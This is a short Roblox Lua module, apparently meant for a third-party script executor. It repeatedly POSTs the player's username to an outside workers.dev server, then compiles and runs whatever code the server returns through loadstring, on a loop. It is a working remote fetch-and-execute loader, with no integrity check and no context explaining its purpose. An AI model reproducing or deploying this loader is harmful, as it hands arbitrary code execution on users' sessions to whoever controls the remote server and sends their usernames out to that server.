local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local CodeRunner = { isLooping = false }

local SERVER_URL = "https://backend-server.114ace114.workers.dev/get-code"
local username = Players.LocalPlayer and Players.LocalPlayer.Name or "Unknown"

local cacheString, cacheFunc = "", nil

function CodeRunner.fetchAndRun()
    local success, response = pcall(request, {
        Url = SERVER_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({ username = username })
    })

    if not success then return false end
    
    local decodeSuccess, json = pcall(HttpService.JSONDecode, HttpService, response.Body)
    if not decodeSuccess or not json or json.status ~= "success" then return false end

    -- Compile if new, execute from upvalue cache if old
    if json.scriptCode ~= cacheString then
        cacheString = json.scriptCode
        cacheFunc = loadstring(json.scriptCode)
    end

    if cacheFunc then 
        pcall(cacheFunc) 
        return true
    end
    return false
end

function CodeRunner.startLoop(interval)
    if CodeRunner.isLooping then return end
    CodeRunner.isLooping = true
    
    task.spawn(function()
        while CodeRunner.isLooping do
            CodeRunner.fetchAndRun()
            task.wait(interval or 5)
        end
    end)
end

function CodeRunner.stopLoop()
    CodeRunner.isLooping = false
end

return CodeRunner
